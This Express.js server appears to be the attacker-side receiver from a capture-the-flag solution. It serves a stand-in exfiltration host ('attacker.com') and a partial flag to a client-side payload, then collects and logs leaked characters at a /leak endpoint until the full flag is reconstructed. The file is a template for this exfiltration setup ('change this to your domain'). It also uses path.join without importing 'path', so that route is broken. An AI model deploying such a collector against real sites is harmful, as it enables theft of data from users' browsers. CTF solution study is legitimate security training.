const express = require("express");

const app = express();
var LEAK_FLAG = "STDIO2025_06{";
const exfil = "attacker.com"; // change this to your domain, this should be same as solve.py
app.use(express.json());
app.use(express.static("public"));

app.use((req, res, next) => {
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  next();
});

app.get("/", (req, res) => {
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  return res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.get("/info", (req, res) => {
  res.json({
    exfil,
    sttf: LEAK_FLAG,
  });
});

app.get("/leak", (req, res) => {
  const { q } = req.query;

  if (q) {
    const rev = q.split("").reverse().join("");
    console.log("Leak:", rev);

    if (rev.length === 26) {
      console.log("The flag is:", rev);
    }

    LEAK_FLAG = rev;

    return res.status(200).end(rev);
  }

  return res.send("N/A");
});

app.get("/check", (req, res) => {
  console.log("[Check] Current flag response:", LEAK_FLAG);
  return res.send(LEAK_FLAG);
});

console.log("Server started on http://localhost:8000");
app.listen(8000);
